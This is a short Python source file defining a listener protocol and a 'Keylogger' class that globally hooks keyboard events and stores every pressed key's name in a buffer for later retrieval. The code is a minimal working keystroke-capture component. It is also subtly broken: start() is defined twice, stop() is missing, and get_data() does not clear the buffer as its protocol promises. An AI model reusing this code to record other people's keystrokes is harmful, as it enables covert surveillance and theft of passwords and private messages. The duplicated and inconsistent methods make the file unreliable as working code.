from typing import List, Protocol
import keyboard


class Listner(Protocol):
    buffer: List[str]  # buffer to store the data

    """
    Listner is a protocol that defines the interface for listening to data.

    it will may be implemented by classes that listen to data in different ways.
    such as:
        Listen to keyboard events
        Listen to mouse events
        Listen to file changes
    """

    def start(self) -> None:
        """
        start listening to data.
        """
        ...

    def stop(self) -> None:
        """
        stop listening to data.
        """
        ...

    def get_data(self) -> List[str]:
        """
        get the data from the buffer.

        Also, clear the buffer after getting the data.
        """
        ...
class Keylogger:
    def __init__(self):
        self.buffer: List[str] = []

    def start(self) -> None:
        """
        start listening to keyboard events.
        """
        keyboard.hook(self._on_key_event)


    def start(self) -> None:
        """
        start listening to keyboard events.
        """
        keyboard.hook(self._on_key_event)

    def get_data(self) -> List[str]:
        """
        get the data that has been collected.
        """
        return self.buffer

    def _on_key_event(self, event):
        """
        internal method to handle key events.
        """
        self.buffer.append(event.name)